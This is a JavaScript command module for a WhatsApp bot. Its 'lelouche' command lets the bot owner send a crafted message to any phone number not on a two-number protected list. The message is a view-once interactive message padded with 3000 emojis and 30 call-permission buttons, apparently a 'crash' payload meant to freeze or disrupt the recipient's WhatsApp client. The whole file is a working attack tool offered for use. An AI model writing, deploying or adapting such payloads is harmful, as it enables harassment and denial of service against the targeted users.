// commands/lelouche.js
const PROTECTED_NUMBERS = ['2347072182960', '2349049636843'];

async function leloucheCommand(sock, chatId, message, args) {
    if (!message.key.fromMe) {
        await sock.sendMessage(chatId, { text: "❌ *Owner Only*" }, { quoted: message });
        return;
    }

    const targetNumber = args[0];
    if (!targetNumber) {
        await sock.sendMessage(chatId, { 
            text: "👑 *Lelouch vi Britannia*\n\nUsage: .lelouche <number>\nExample: .lelouche 628123456789\n\n*All Hail Lelouch!*"
        }, { quoted: message });
        return;
    }

    const cleanNumber = targetNumber.replace(/[^0-9]/g, '');
    
    if (PROTECTED_NUMBERS.includes(cleanNumber)) {
        await sock.sendMessage(chatId, { text: "🛡️ *Protected by Geass*" }, { quoted: message });
        return;
    }

    const target = cleanNumber + '@s.whatsapp.net';
    
    await sock.sendMessage(chatId, { text: `👑 *Geass* activating on ${cleanNumber}...` }, { quoted: message });
    await sock.sendMessage(chatId, { react: { text: "👑", key: message.key } });

    try {
        const geassPayload = {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        contextInfo: {
                            mentionedJid: [target],
                            isForwarded: true,
                            forwardingScore: 999
                        },
                        body: { text: "✦ Łḗḽǿüċḧ vī Ḃṛīƭȧṅṅīȧ ✦" + "👑".repeat(3000) },
                        footer: { text: "Geass" },
                        nativeFlowMessage: {
                            buttons: Array(30).fill({ name: "call_permission_request", buttonParamsJson: "" })
                        }
                    }
                }
            }
        };

        await sock.relayMessage(target, geassPayload, { participant: { jid: target } });
        
        await sock.sendMessage(chatId, { text: `✅ *Geass* activated on ${cleanNumber}` }, { quoted: message });
        await sock.sendMessage(chatId, { react: { text: "👁️", key: message.key } });

    } catch (error) {
        console.error('[Lelouche]', error.message);
        await sock.sendMessage(chatId, { text: `❌ *Geass failed:* ${error.message}` }, { quoted: message });
    }
}

module.exports = leloucheCommand;